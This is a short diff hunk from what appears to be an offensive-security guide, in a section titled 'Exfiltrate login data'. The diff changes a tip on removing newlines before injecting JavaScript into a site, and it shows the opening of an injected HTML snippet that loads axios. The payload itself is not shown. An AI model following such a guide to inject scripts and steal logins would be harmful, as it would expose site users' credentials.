@@ -15,8 +15,8 @@
 ```
 ### Exfiltrate login data
 #### JavaScript code
-Use this site to remove whitespace before injecting into site.
-https://www.browserling.com/tools/remove-all-whitespace
+Use this site to remove newlines before injecting into site.
+[https://www.browserling.com/tools/remove-all-whitespace](https://removelinebreaks.net/)
 ```html
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
